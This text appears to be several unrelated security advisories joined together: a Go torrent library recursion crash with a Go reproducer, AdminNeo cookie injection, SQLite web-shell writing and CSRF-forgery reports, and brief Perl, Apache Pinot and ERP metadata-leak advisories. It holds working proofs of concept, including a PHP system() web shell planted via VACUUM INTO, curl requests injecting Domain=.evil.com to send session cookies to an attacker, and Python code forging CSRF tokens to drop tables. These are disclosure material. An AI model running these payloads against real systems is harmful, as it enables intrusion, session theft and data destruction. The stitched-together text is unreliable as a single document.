for key, bytes := range dir {
    var sub FileTree
    err = sub.UnmarshalBencode(bytes)   // <- recurses once per file-tree level, and each call re-runs
                                        //   bencode.Unmarshal over its entire subtree
```

`FileTree` implements `bencode.Unmarshaler` (`file-tree.go:53`), so the `file tree` field of a v2 info dict (`metainfo/info.go:33`) routes through it. Each level calls `sub.UnmarshalBencode`, which starts with `bencode.Unmarshal(bytes, &dir)` over the *whole remaining subtree*. A file tree nested `D` levels deep therefore performs O(D) `bencode.Unmarshal` calls, each over an O(D)-sized payload - O(D²) total parse work. The steady state is a CPU-bound single goroutine, so the embedding process simply hangs.

Reachability: any `bencode.Unmarshal` into `metainfo.Info`, including the peer-metadata path `setInfoBytesLocked` (`torrent.go:638`) for a magnet/v2 download, and `MetaInfo.UnmarshalInfo` (`metainfo/metainfo.go:61-64`).

### Sanitizers / existing limits that do NOT apply

- `Decoder.MaxStrLen` (`bencode/decode.go:787-791`, default 128 MiB) bounds a *single string value*; it is never consulted by `readOneValue` (`decode.go:564` does `io.CopyN(&d.buf, d.r, length)` with no `MaxStrLen` check) and does not bound dict/list nesting depth.
- The existing fuzzers (`bencode/fuzz_test.go`) only round-trip `interface{}` values; small fuzz inputs cannot synthesize the millions of nesting levels needed to trip the stack limit, which is why this has evaded them.

## Impact

- **Denial of service / availability (complete process crash).** A single ~8 MB `.torrent` file, or ~8 MB of metadata from a malicious peer, crashes the embedding application with `fatal error: stack overflow` (Defect 1). The crash is not recoverable in-process. For a server that ingests user-submitted torrents or runs a long-lived swarm, this is a trivial remote DoS: seed a torrent whose metainfo nests lists deeply, and any client that fetches the metadata dies.
- **Denial of service / availability (CPU starvation).** A ~0.2-0.6 MB v2 info dict with a deeply nested file tree pins a core for ~66 s to minutes and blocks any other decode work sharing the process (Defect 2).

Threat actor: an unauthenticated remote peer (v2/magnet metadata, within the allowed 16 MiB metadata size - `global.go:18`) or a local user opening a malicious `.torrent`. The remote-peer case is the higher-reachability/cloud scenario; the local-file case requires the victim to open one file (conservative `UI:R`). Headline CVSS 3.1 base `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H` = **6.5** (remote, low-complexity, unauthenticated, requires the victim to open a torrent or receive peer metadata, single-process availability loss); for applications that ingest torrents with no user interaction (programmatic server ingestion), UI becomes `N`, raising it to 7.5. CWE-674 (`Uncontrolled Recursion`) is the precise root cause for Defect 1; CWE-407 (`Inefficient Algorithmic Complexity`) covers Defect 2.

Per-metric justification (headline 6.5 vector, `UI:R`):
- **Attack Vector (AV): Network** - the trigger is peer-supplied metadata (magnet/v2 download, within the 16 MiB metadata budget) or a `.torrent` file opened by any client of the library; no local access required.
- **Attack Complexity (AC): Low** - the payload is a deterministic list-nesting pattern in metainfo; no race, heap grooming, or special environment.
- **Privileges Required (PR): None** - feeding metainfo to the decoder is the unprivileged, public API usage.
- **User Interaction (UI): Required** - the conservative remote scenario needs the victim to open a magnet/torrent (or accept a peer's metadata); programmatic server ingestion removes this (UI:N -> 7.5).
- **Scope (S): Unchanged** - the impacted security authority is the embedding process itself.
- **Confidentiality (C): None** - no data disclosure.
- **Integrity (I): None** - no data modification.
- **Availability (A): High** - Defect 1 terminates the process with `fatal error: stack overflow` (unrecoverable); Defect 2 starves a core for ~66 s+ per 0.2 MB v2 info dict with clean quadratic scaling.

## Reproduction Steps

All runs are local-only within the test host; nothing contacts a network.

### Environment and single harness

The harness is a single Go program (`go test`-style) that builds the malicious payload, then decodes it through the same public API the library uses. It reproduces **both** defects. Set up a temp module and run the two tests separately (Defect 1 crashes the process, so the two defects cannot share one test run):

```bash
go mod init torrent_recursion_dos
go mod edit -require github.com/anacrolix/torrent@v1.61.0
go mod edit -replace github.com/anacrolix/torrent=/path/to/your/checkout
go test -run TestDefect1_StackOverflow -v .
go test -run TestDefect2_CPUExhaustion -v .
```

Harness (`torrent_recursion_dos_test.go`, placed in a temp module that imports the local clone):

```go
package torrent_recursion_dos

import (
	"bytes"
	"fmt"
	"os"
	"testing"

	"github.com/anacrolix/torrent/bencode"
	"github.com/anacrolix/torrent/metainfo"
)

// buildInfo loops a list (l ... l e ... e) nested `depth` levels, wrapped in a
// valid .torrent: { "info": <that list> }.
func buildInfo(depth int, mode byte) []byte {
	var b bytes.Buffer
	b.WriteString("d4:infod")
	for i := 0; i < depth; i++ {
		b.WriteByte(mode) // 'l' for a nested list
	}
	for i := 0; i < depth; i++ {
		b.WriteByte('e')
	}
	b.WriteString("ee")
	return b.Bytes()
}

// buildV2Info builds a v2 info dict whose "file tree" nests `depth` single-key
// dicts around a valid 32-byte-pieces-root file leaf.
func buildV2Info(depth int) []byte {
	leaf := map[string]interface{}{
		"": map[string]interface{}{
			"length":      5,
			"pieces root": string(bytes.Repeat([]byte{'A'}, 32)),
		},
	}
	node := leaf
	for i := 0; i < depth; i++ {
		node = map[string]interface{}{"a": node}
	}
	info := map[string]interface{}{
		"meta version": 2, "piece length": 32768, "file tree": node,
	}
	out, _ := bencode.Marshal(info)
	return out
}

// Defect 1: metainfo.Load on a .torrent with a deeply nested info list
// derives a fatal `goroutine stack exceeds 1000000000-byte limit`.
func TestDefect1_StackOverflow(t *testing.T) {
	depth := 4_000_000 // ~8 MB; adjust down if the runtime stack cap differs
	in := buildInfo(depth, 'l')
	if len(os.Getenv("SKIP_CRASH")) == 0 {
		// Decodes into MetaInfo; InfoBytes is a bencode.Bytes unmarshaler, so
		// this drives readOneValue recursion. Crashes the process.
		_, err := metainfo.Load(bytes.NewReader(in))
		_ = err
	}
	fmt.Printf("[defect1] decoded depth=%d without crashing\n", depth)
}

// Defect 2: decoding a v2 info dict with a deep file tree is CPU-quadratic.
func TestDefect2_CPUExhaustion(t *testing.T) {
	depth := 30_000 // ~0.2 MB; ~66 s on this machine
	src := buildV2Info(depth)
	var info metainfo.Info
	if err := bencode.Unmarshal(src, &info); err != nil {
		t.Fatal(err)
	}
	fmt.Println("[defect2] parsed deep v2 file tree")
}
```

Observations with the pinned commit (Go 1.26, laptop):

```
# TestDefect1 - process aborts, unrecoverable:
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow
[exit status 2]

# TestDefect2 - wall-clock parse time (single-threaded):
depth=30_000              => ~66 s
depth=60_000              => >90 s (timeout)
```

To reproduce defect 1 from a saved file instead of the in-memory harness, generate the payload and open it with any of the shipped tools or the `metainfo.Load` API. The payload is produced inline by the Go harness above; equivalently, emit the same 8,000,010 bytes as `d4:infod` + 4,000,000 `l` + 4,000,000 `e` + `ee`:

```bash
./cmd/torrent -seed -metainfo ./crash.torrent   # crashes
```

The payload is a single static file; it performs no network I/O, writes nothing, and is a plain non-destructive crash reproducer (a harness, not a weapon).

## Recommendations

1. **Add a nesting-depth limit to the decoder** (recommended, fixes both defects). Thread a depth counter through `parseValue` / `parseDict` / `parseList` / `parseValueInterface` / `parseListInterface` / `parseDictInterface` / `readOneValue`, and return a `SyntaxError` when it exceeds a sane bound (e.g. 64). Forward-compatibly, expose it on `Decoder` like the existing `MaxStrLen` (`bencode/decode.go:21-32`). 2. **Make `readOneValue` length-aware.** Apply the same `MaxStrLen` bound to the `io.CopyN(&d.buf, d.r, length)` at `bencode/decode.go:564` instead of trusting the raw length field, so oversized bulk fields fail as `SyntaxError` instead of being buffered. 3. **Break the O(n²) in `FileTree.UnmarshalBencode`.** Parse the file tree with an explicit, depth-bounded iterative walk (or a single pass over the raw value) instead of re-running `bencode.Unmarshal` on every subtree level. The depth bound from (1) already arrests the quadratic growth. 4. **Convert fatal overflow into a recoverable error.** Guarantee that no input can grow the goroutine stack beyond the runtime limit; the depth bound in (1) achieves this. Do not rely on `recover()` - a stack overflow is `fatal` and unrecoverable in Go. 5. **Fuzz with depth in mind.** Add a fuzz seed / corpus that includes deeply nested `d`/`l` values and assert both that decoding returns an error (not a crash) and that no level trips the depth limit.

## References

- Source (pinned): `https://github.com/anacrolix/torrent @ 4ad31c5170787215c51c6ddaa54abc06b623c11c`
  - Unbounded recursion: `bencode/decode.go:546-549`, `bencode/decode.go:591`
  - File-tree recursion: `metainfo/file-tree.go:42-49`
  - Public entry points: `metainfo/metainfo.go:35-50`, `client.go:1776`, `torrent.go:638`
  - Missing `MaxStrLen` in bulk read: `bencode/decode.go:564`
  - Metadata size cap (remote reachability): `global.go:18`, reassembly call `torrent.go:1874`
- Prior hardening in this codebase (unrelated to this class, recorded for completeness):
  - v2 pieces-root panic fix: commit `7218a979` ("validate v2 file tree pieces root length before torrent setup"), present at the pinned commit via `misc.go:92` -> `file-tree.go:164`.
  - Path-traversal safeguards in storage (`storage/file-paths.go:32` `isSubFilepath`, `storage/safe-path.go:16` `ToSafeFilePath`) - inspected and found to hold (not the issue here).
- No published advisory found: OSV.dev and NVD return no records for the package (`github.com/anacrolix/torrent`, purl `pkg:golang/github.com/anacrolix/torrent`); the Go ecosystem advisory database lists none.

### Summary

AdminNeo versions 4.6.0 through at least 5.5.0 are vulnerable to cookie attribute injection via the `X-Forwarded-Prefix` HTTP header. An attacker who can influence this header (e.g., through a reverse proxy that forwards it from clients, an attacker-controlled upstream proxy, or a man-in-the-middle position) can inject arbitrary cookie attributes including `Domain`, `Path`, `Secure`, and `SameSite` into all `Set-Cookie` response headers emitted by AdminNeo.

This allows an attacker to expand the cookie scope to an attacker-controlled domain (e.g., `Domain=.evil.com`), causing the victim's browser to send AdminNeo's `neo_sid` (session ID) and `neo_key` (database password encryption key) cookies to the attacker's server on subsequent requests.

Originally reported by @retkoussa in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-c533-9qwm-8w5h

### Vulnerable Code

**Root cause 1 - Unsanitized header prepended to `REQUEST_URI`**
(`admin/include/bootstrap.inc.php`, lines 50–52):

```php
if ($_SERVER["HTTP_X_FORWARDED_PREFIX"]) {
	$_SERVER["REQUEST_URI"] = $_SERVER["HTTP_X_FORWARDED_PREFIX"] . $_SERVER["REQUEST_URI"];
}
```

The client-supplied `X-Forwarded-Prefix` header is concatenated into `REQUEST_URI` with no validation or sanitization of special characters (specifically semicolons, which delimit cookie attributes).

**Root cause 2 - Manual `Set-Cookie `header construction without escaping**
(`admin/include/functions.inc.php`, lines 416–424):

```php
function cookie(string $name, string $value, int $lifetime = 2592000): void
{
	header("Set-Cookie: $name=" . rawurlencode($value)
		. ($lifetime ? "; expires=" . gmdate("D, d M Y H:i:s", time() + $lifetime) . " GMT" : "")
		. "; path=" . preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"])
		. (HTTPS ? "; secure" : "")
		. "; HttpOnly; SameSite=lax",
		false);
}
```

The tainted `REQUEST_URI` is interpolated directly into the `path=` attribute of the `Set-Cookie` header. Since semicolons are not stripped or escaped, any `;`-separated directives injected via `X-Forwarded-Prefix` become valid cookie attributes parsed by the browser.

**Root cause 3 - Session cookie also tainted**
(`admin/include/bootstrap.inc.php`, line 61):

```php
session_set_cookie_params(0, preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"]), "", HTTPS, true);
```

The PHP session cookie (`neo_sid`) path is similarly derived from the tainted `REQUEST_URI`, extending the same vulnerability to the session cookie set by PHP itself.

### Impact

- **Session hijacking:** The `neo_sid` session cookie is sent to the attacker's domain, allowing full session takeover.
- **Credential theft:** The `neo_key` cookie contains the key used to encrypt/decrypt database passwords stored in the session. With this key, an attacker can decrypt saved database credentials.
- **Session fixation:** An attacker can inject arbitrary `Path`, `SameSite`, and `Secure` attributes, manipulating cookie behavior.
- **Wide applicability:** The `X-Forwarded-Prefix` header was specifically added to support reverse proxy deployments (Traefik `PathPrefixStrip`, nginx, HAProxy). These are the exact environments where this header is forwarded from clients, making the vulnerability relevant in the deployments it was designed for.

### Affected Cookies

|**Cookie**|**Content**|**Risk**|
|`neo_sid`|PHP session ID|Session hijacking|
|`neo_key`|Encryption key for stored DB passwords|Credential theft|
|`neo_settings`|User preferences|Low (information disclosure)|

### Proof of Concept

```shell
# Normal request with clean Set-Cookie headerss:
curl -sI http://localhost:8080/adminneo/index.php | grep -i set-cookie
> Response: Set-Cookie: neo_key=...; path=/adminneo/index.php; HttpOnly; SameSite=lax

# Malicious request — inject Domain=.evil.com:
curl -sI -H "X-Forwarded-Prefix: /adminneo; Domain=.evil.com" \
  http://localhost:8080/adminneo/index.php | grep -i set-cookie
> Response: Set-Cookie: neo_key=...; path=/adminneo; Domain=.evil.com/adminneo/index.php; HttpOnly; SameSite=lax
#                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^ INJECTED

# Full attribute override - inject Domain + SameSite=None:
curl -sI -H "X-Forwarded-Prefix: /; Path=/; Domain=.attacker.com; SameSite=None" \
  http://localhost:8080/adminneo/index.php | grep -i set-cookie
> Response Set-Cookie: neo_key=...; path=/; Path=/; Domain=.attacker.com; SameSite=None/adminneo/index.php; ...
```

### Recommended Fix

1. **Sanitize `X-Forwarded-Prefix`:** Strip or reject semicolons, newlines, and other HTTP header metacharacters from the `X-Forwarded-Prefix` value before using it.
2. **Use `setcookie()` / `setrawcookie()`:** Replace the manual `header("Set-Cookie: ...")` construction in `cookie()` with PHP's built-in `setcookie()` function, which properly escapes attribute values.
3. **Validate `REQUEST_URI` before cookie use:** After any prefix manipulation, strip characters that are invalid in a cookie `path` attribute (`;`, `,`, whitespace per RFC 6265).

```php
// Example fix for bootstrap.inc.php:
if ($_SERVER["HTTP_X_FORWARDED_PREFIX"]) {
    $prefix = preg_replace('~[;\r\n].*~', '', $_SERVER["HTTP_X_FORWARDED_PREFIX"]);
    $_SERVER["REQUEST_URI"] = $prefix . $_SERVER["REQUEST_URI"];
}
```

### Server Based Workaround Via Config

Configure the reverse proxy to set `X-Forwarded-Prefix` to a static, trusted value rather than forwarding the client-supplied header:

```nginx
# nginx — secure configuration:
fastcgi_param HTTP_X_FORWARDED_PREFIX /adminneo;  # static value, not $http_x_forwarded_prefix
```

```yaml
# Traefik, use middleware instead of client headers:
middlewares:
  strip-prefix:
    stripPrefix:
      prefixes:
        - "/adminneo"
```

## Summary
Adminer blocks `ATTACH` queries for SQLite to prevent arbitrary file creation. However, `VACUUM INTO` is not blocked and achieves the same result: writing a database file containing attacker-controlled PHP code to any path with any extension. An authenticated SQLite user can write a web shell to the web root and execute commands.

Originally reported in Adminer: [GHSA-q4f2-39gr-45jh](https://github.com/vrana/adminer/security/advisories/GHSA-gmx3-g29w-77wf)

## Root Cause
sql.inc.php, line 146:

```php
if (DIALECT == "sqlite" && preg_match("~^$space*+ATTACH\\b~i", $q, $match)) {
    // blocked
}
```

Only `ATTACH` is in the blocklist. `VACUUM INTO` (available since SQLite 3.27.0) writes the entire database to a new file at an arbitrary path with an arbitrary extension. It is not checked.

## Steps To Reproduce

### 1.  Login to SQLite
1. Open AdminNeo and select driver: **SQLite**
2. Login and create a new database (e.g., `stage.db`)

### 2. Inject PHP code and write the shell

Navigate to **SQL command** and execute:

```sql
CREATE TABLE "<?php system($_GET['c']); ?>" (i int);
VACUUM INTO '/var/www/html/shell.php';
```

The SQLite file is written to `/var/www/html/shell.php`. The table name containing `<?php` appears as raw bytes in the file. PHP's parser finds and executes it.

### 3. Execute commands

```shell
curl "http://TARGET/shell.php?c=id"
# uid=0(root) gid=0(root) groups=0(root)
```

## Collaborator Request

This vulnerability was discovered jointly with Yashar Shahinzadeh (GitHub: @voorivex). Could you please add him as a collaborator on this advisory and credit him as a co-discoverer? Thank you!

### Summary AdminNeo's CSRF protection uses a BREACH-resistant XOR masking scheme, but the implementation transmits both the XOR mask and the masked value in every token. This allows any observer who sees a single CSRF token (via network sniffing, log files, Referrer header, or XSS) to instantly recover the session secret and forge unlimited valid CSRF tokens. Additionally, the underlying session token has only ~20 bits of entropy (`rand(1, 1e6)`), making blind brute-force feasible even without token observation. Originally reported by @az0mb13 in Adminer: [GHSA-q4f2-39gr-45jh](https://github.com/vrana/adminer/security/advisories/GHSA-33j4-hc95-pggg) ### Details Token generation in `admin/include/functions.inc.php` lines 1181-1184: ```php function get_token() { $rand = rand(1, 1e6); return ($rand ^ $_SESSION["token"]) . ":$rand"; } ``` Token verification in lines 1189-1192: ```php function verify_token() { list($token, $rand) = explode(":", $_POST["token"]); return ($rand ^ $_SESSION["token"]) == $token; } ``` Session token initialized in `admin/include/auth.inc.php` lines 327 and 385: ```php $_SESSION["token"] = rand(1, 1e6); ``` **Three distinct weaknesses:** 1. **Instant recovery:** The token format `(rand XOR secret):rand` transmits both operands. Recovery is trivial: `secret = masked_value XOR rand`. 2. **Low entropy**: Only 1,000,000 possible session tokens (~20 bits). Blind brute-force requires at most 1M requests. 3. **Loose comparison**: `verify_token()` uses `==` (loose comparison) instead of `===`, enabling PHP type juggling. ### PoC **Validated against a live AdminNeo 5.5.0 instance (MySQL 8.0, PHP 8.2).** **Step 1: Observe a single CSRF token** Load any authenticated AdminNeo page and extract a token from the HTML source. Tokens appear in hidden form fields: ```html ``` Token observation vectors: Referrer header leak, shared proxy logs, browser history, limited XSS, network sniffing. **Step 2: Recover the session secret (instant, 1 XOR operation)** ```python observed = "542273:441804" masked, rand_val = observed.split(":") session_secret = int(masked) ^ int(rand_val) # Result: 817530 ``` The token format is `(rand XOR secret):rand`. Both operands are transmitted, so the secret is recovered with a single XOR — zero additional requests needed. **Step 3: Forge unlimited valid CSRF tokens** ```python import random forge_rand = random.randint(1, 1000000) forged = f"{forge_rand ^ session_secret}:{forge_rand}" # Example output: 729376:481370 ``` Each forged token is unique and valid. The attacker can generate as many as needed. **Step 4: Execute arbitrary SQL with the forged token** ```shell # Forged token used to DROP a table the attacker never had a token for: curl -b victim_cookies.txt \ 'http://target/adminneo/?mysql=127.0.0.1&username=root&db=testdb&sql=' \ --data-urlencode "token=729376:481370" \ --data-urlencode "query=DROP TABLE csrf_victim_table;" \ -d "limit=0" ``` **Step 5: Verify a random wrong token is rejected (control)** ```shell curl -b victim_cookies.txt \ 'http://target/adminneo/?mysql=127.0.0.1&username=root&db=testdb&sql=' \ --data-urlencode "token=111:222" \ --data-urlencode "query=SELECT 1" -d "limit=1" # Result: "Invalid CSRF token. Send the form again." ``` **Weaponized CSRF attack page** In a real attack, the attacker hosts this HTML page and lures the victim to visit it while authenticated to AdminNeo: ```html

Click here for free database optimization tips

``` ### Impact - **Cross-Site Request Forgery** against authenticated AdminNeo users. Validated: forged token used to CREATE TABLE, INSERT data, SELECT data, and DROP TABLE — all accepted by the server. - An attacker who observes a single CSRF token (via Referrer header, proxy logs, XSS, or network sniffing) can instantly recover the session secret and forge unlimited valid tokens. - With a forged token, the attacker can execute arbitrary SQL through the victim's session: drop tables/databases, exfiltrate data, create backdoor users, or modify records. - The low entropy (~20 bits, 1M possible values) also enables blind brute-force without observing any token, requiring at most 1M requests (~17 minutes at 1000 req/sec).

DateTime::Lite versions before 0.8.1 for Perl allow CPU exhaustion via a per-day loop when adding seconds.

_normalize_leap_seconds crosses day boundaries one day at a time, so add(seconds => $n) on an object with a non-floating time zone takes about |$n|/86400 iterations, and nothing limits $n. The XS implementation and the pure-Perl fallback both have the loop.

An attacker who controls the number of seconds added can keep the process busy for as long as they choose.

items.summary:
Incorrect Authorization vulnerability in the single-stage query engine of Apache Pinot.

When broker access control is enabled, the single-stage query engine authorizes only the table named in the query's FROM clause. The lookup() transform function identifies its dimension table with a string literal argument rather than through the FROM clause, so that table was never included in the authorization check. An authenticated user who is authorized for at least one table can therefore read columns from any dimension table in the cluster, including tables they have no access to, and can retrieve arbitrary rows of it by supplying primary key values directly. Per-principal row-level security filters configured on the dimension table are likewise not applied.

The multi-stage query engine is not affected.

This issue affects Apache Pinot: through 1.5.1

Users are recommended to upgrade to version 1.6.0, which fixes this issue.

items.summary: ## Summary **Fectura Scripts** is an open-source ERP application, a **sensitive information disclosure vulnerability** was identified in the **Library** module's image upload and download pipeline. The application fails to strip EXIF and other embedded metadata from user-uploaded image files before storing them and serving them for download. As a result, any authenticated user who downloads an image from the Library can extract the original uploader's **GPS coordinates, device information, timestamps, embedded comments/notes, thumbnail previews, and other personally identifiable information (PII)** preserved in the image metadata. This vulnerability carries significant real-world impact: **an employee uploading a photo taken at their home inadvertently discloses their precise home address to every user with Library download access.** --- ## Affected Functionality Overview Fectura Scripts exposes image upload capabilities across several modules (e.g., email composition, profile settings, etc.). During testing, the **Library section** was identified as the only module that provides: - **Full image upload** (unrestricted image types observed) - **Persistent storage** of uploaded files - **Direct download** capability for any authenticated user with access - **No server-side metadata sanitization** at any point in the pipeline (upload, storage, or delivery) Other modules (e.g., email attachments) were also tested but either did not render images or had limited upload/download exposure. --- ## Technical Background ### What Is EXIF/Image Metadata? Most modern image formats (JPEG, TIFF, PNG with ancillary chunks, HEIC, WebP with XMP) embed metadata automatically at creation time. This metadata can include: | Metadata Category | Example Fields | Privacy Risk | |---|---|---| | **GPS / Geolocation** | GPSLatitude, GPSLongitude, GPSAltitude, GPSTimestamp | **Critical** — reveals exact physical location | | **Device Information** | Make, Model, Software, LensModel | Medium — device fingerprinting | | **Timestamps** | DateTimeOriginal, CreateDate, ModifyDate | Medium — behavioral profiling | | **User Comments** | UserComment, ImageDescription, XPComment, XPAuthor | **High** — may contain names, notes, PII | | **Thumbnails** | ThumbnailImage (embedded JPEG preview) | **High** — may preserve original uncropped image | | **Serial Numbers** | BodySerialNumber, LensSerialNumber, InternalSerialNumber | Medium — unique device tracking | | **Network/Software** | HostComputer, Software, ProcessingSoftware | Low–Medium — infrastructure disclosure | | **XMP / IPTC** | Creator, Rights, Description, Keywords | Medium — organizational/authorship leakage | ### Why This Matters in an ERP Context ERP platforms are used by businesses with multiple employees, contractors, clients, and sometimes external partners accessing shared resources. The **Library** module is inherently a collaborative, shared-access feature. Any image uploaded by one party is downloadable by many others — creating a **one-to-many PII exposure vector**. --- ## Step-by-Step Reproduction ### Prerequisites - A valid user account with access to the **Library** module (tested with Admin role; lower-privilege roles should also be tested) - A test image file containing rich EXIF/metadata (see Step 1) - An EXIF analysis tool: `exiftool` (CLI), or any online EXIF viewer --- ### Step 1: Prepare a Metadata-Rich Test Image Create or obtain a JPEG image with embedded GPS and descriptive metadata. You can inject test metadata using `exiftool`: ```bash exiftool \ -GPSLatitude="48.8566" \ -GPSLatitudeRef="N" \ -GPSLongitude="2.3522" \ -GPSLongitudeRef="E" \ -GPSAltitude="35" \ -UserComment="Confidential: Taken at employee home address" \ -XPAuthor="John Doe" \ -Make="Apple" \ -Model="iPhone 15 Pro Max" \ -DateTimeOriginal="2025:01:15 09:30:00" \ test_image.jpg ``` Verify metadata is present: ```bash exiftool test_image.jpg ``` Expected output should show all injected fields including GPS coordinates resolving to **Paris, France (48.8566°N, 2.3522°E)**. --- ### Step 2: Log in to Fectura Scripts 1. Navigate to the Fectura Scripts login page. 2. Authenticate with valid credentials. 3. Confirm access to the application dashboard. --- ### Step 3: Navigate to the Library Section 1. From the main navigation/sidebar, click on **"Library"** (or equivalent menu entry). 2. Confirm the Library module loads and displays existing files/images (if any). --- ### Step 4: Upload the Test Image 1. Click the **"Upload"** button/action within the Library interface. 2. Select the prepared `test_image.jpg` file. 3. Complete the upload process (fill any required fields such as title/description if prompted). 4. Confirm the image appears in the Library listing. --- ### Step 5: Download the Image (as the Same or Different User) 1. Locate the uploaded image in the Library. 2. Click the **"Download"** button/link (or right-click → Save As on the rendered image, depending on UI). 3. Save the file locally as `downloaded_image.jpg`. > **Note:** For stronger proof of impact, perform this step logged in as a **different user account** with Library access, demonstrating cross-user information leakage. --- ### Step 6: Extract and Analyze Metadata from the Downloaded File Run `exiftool` on the downloaded file: ```bash exiftool downloaded_image.jpg ``` **Observed Result (Vulnerable):** ``` GPS Latitude : 48 deg 51' 23.76" N GPS Longitude : 2 deg 21' 7.92" E GPS Altitude : 35 m GPS Position : 48.8566°N, 2.3522°E User Comment : Confidential: Taken at employee home address XP Author : John Doe Make : Apple Model : iPhone 15 Pro Max Date/Time Original : 2025:01:15 09:30:00 ... [ALL original metadata preserved in full] ``` **Expected Result (Secure):** All EXIF, XMP, IPTC, GPS, and comment fields should be **stripped or neutralized** before storage or at download time. Only essential image rendering data should remain. --- ### Step 7: Confirm GPS Resolution to Physical Location Take the extracted GPS coordinates and resolve them: ``` https://www.google.com/maps?q=48.8566,2.3522 ``` This confirms the metadata resolves to a **precise, real-world physical location** — demonstrating the severity of the leak. --- ## Root Cause Analysis The application's image upload handler in the Library module **stores the uploaded file byte-for-byte without any server-side processing to remove metadata**. The download handler then serves the identical file. At no point in the pipeline is any of the following performed: 1. **EXIF stripping** (e.g., via libraries like `Intervention Image`, `Imagick::stripImage()`, Python Pillow's `.save()` without EXIF, or `jpegtran -copy none`) 2. **Re-encoding / reprocessing** of the image (which would naturally discard non-image data) 3. **Selective metadata whitelisting** (preserving only color profile / orientation data) 4. **Content-Disposition header enforcement** to prevent inline rendering with metadata intact This is a **design-level omission** rather than a bypassable control — there is simply no metadata handling logic present. --- ## Impact Assessment ### Direct Impacts | Impact | Description | Severity | |---|---|---| | **Geolocation Disclosure** | GPS coordinates in uploaded photos can reveal home addresses, office locations, client sites, travel patterns of employees | **High** | | **PII Leakage** | Author names, comments, device owner names embedded in metadata expose personal identity | **High** | | **Device Fingerprinting** | Camera make/model, serial numbers, and software versions enable tracking and targeting of specific individuals or devices | **Medium** | | **Behavioral Profiling** | Timestamps and sequential GPS data across multiple uploads can reconstruct an individual's movements and schedule | **High** | | **Embedded Thumbnail Leakage** | Thumbnails may preserve the original uncropped image, potentially exposing content the user intentionally cropped out (documented in prior CVEs) | **Medium–High** | ### Contextual / Escalated Impacts - **Regulatory Exposure:** GPS coordinates and author names constitute **personal data** under GDPR (Art. 4(1)), CCPA, and similar frameworks. Failure to strip this data from shared/downloadable resources may constitute a **data protection violation** for organizations using Fectura Scripts. - **Insider Threat Amplification:** A malicious insider (employee, contractor) with Library download access can silently harvest geolocation and identity data of colleagues without any logging or indication to the victim. - **Physical Security Risk:** In sectors where employee physical safety is paramount (e.g., legal, law enforcement, journalism, NGOs, domestic violence support), leaking home GPS coordinates through an ERP system represents a **direct physical safety threat**. - **Supply Chain Risk:** If the Library is shared with external partners/vendors, the exposure surface extends beyond the organization. ### Why CVSS 6.5 Understates the Risk The CVSS base score of 6.5 reflects the mechanical characteristics of the vulnerability (network-accessible, low complexity, authenticated). However, the **contextual severity is higher** because: 1. Users have **no expectation** that uploading an image to an ERP system will broadcast their home coordinates. 2. The attack is **completely passive** — the attacker simply downloads a file; no exploitation toolkit or special skills are required. 3. The leaked data (GPS, PII) is **irrevocable** — once downloaded, the victim cannot "un-leak" their location. 4. The vulnerability affects **every image ever uploaded** to the Library, creating a retroactive exposure of historical data. **Recommended effective severity: HIGH for any deployment handling real employee/client data.** --- ## Recommended Remediation ### Immediate (Short-Term) | Priority | Action | |---|---| | **P0** | Implement **server-side EXIF/metadata stripping** on all image uploads in the Library module **before storage**. | | **P0** | **Retroactively strip metadata** from all existing images already stored in the Library. | | **P1** | Extend metadata stripping to **all other upload endpoints** across the application (email attachments, profile photos, product images, etc.). | ### Implementation Guidance (by Language/Stack) **PHP (likely stack for Fectura Scripts):** ```php // Using GD (built-in, no dependencies) function stripMetadata($sourcePath, $destPath) { $image = imagecreatefromjpeg($sourcePath); imagejpeg($image, $destPath, 95); // Re-encodes, discarding all EXIF imagedestroy($image); } // Using Imagick (if available) $img = new Imagick($sourcePath); $img->stripImage(); // Removes all EXIF, IPTC, XMP profiles $img->writeImage($destPath); ``` **Python:** ```python from PIL import Image img = Image.open("uploaded.jpg") data = list(img.getdata()) clean = Image.new(img.mode, img.size) clean.putdata(data) clean.save("clean.jpg") ``` **Command-line (for retroactive cleanup):** ```bash # Strip all metadata from all JPEGs in the library storage directory exiftool -all= -overwrite_original /path/to/library/uploads/*.jpg ``` ### Long-Term (Architectural) | Priority | Action | |---|---| | **P1** | Establish a **centralized file upload processing pipeline** that all modules route through, ensuring consistent sanitization. | | **P1** | Add **Content Security Policy** and `Content-Disposition: attachment` headers on all file downloads to reduce inline rendering risks. | | **P2** | Implement a configurable **metadata policy** (e.g., allow admins to choose between full strip, preserve orientation only, or preserve color profile). | | **P2** | Add **file type validation** (magic byte checking, not just extension) to the upload pipeline. | | **P3** | Consider adding a **user-facing warning** at upload time: "Note: Image metadata will be stripped for privacy." | --- ## 9. References | Resource | URL | |---|---| | CWE-200: Exposure of Sensitive Information | https://cwe.mitre.org/data/definitions/200.html | | CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer | https://cwe.mitre.org/data/definitions/212.html | | NIST NVD CVSS v3.1 Calculator | https://www.first.org/cvss/calculator/3.1 | | GDPR Art. 4(1) — Definition of Personal Data | https://gdpr-info.eu/art-4-gdpr/ | | ExifTool by Phil Harvey | https://exiftool.org/ | | Related CVE | https://nvd.nist.gov/vuln/detail/CVE-2023-29850 | --- ## 11. Conclusion The absence of image metadata sanitization in Fectura Scripts' Library module is a **clear, easily exploitable, and high-impact information disclosure vulnerability**. It requires no technical skill to exploit (just a file download and a free tool), it leaks data that users never intended to share (home GPS coordinates, personal identity), and it affects every image ever uploaded to the platform retroactively. While the CVSS base score of **6.5** categorizes this as "Medium," the real-world privacy consequences — particularly under GDPR and in contexts where physical safety is relevant — warrant treating this with **High urgency**. The fix is straightforward, well-documented, and should be implemented immediately across all upload endpoints.

Business::GoCardless versions before 1.01 for Perl complete redirect flows without checking the session token, letting a leaked redirect flow ID create payments against another customer's mandate.

confirm_resource takes no session token from the caller. It reads the redirect flow back from the GoCardless API and completes it with the token from that response, so the check that the flow is completed by the session that started it always passes. It then creates the requested payment or subscription against the flow's mandate. Since version 1.00, a flow that already has a mandate is returned as confirmed without being completed again, so the same ID creates a new payment on every call.

A remote attacker who obtains another customer's redirect flow ID can create payments or subscriptions against that customer's mandate.

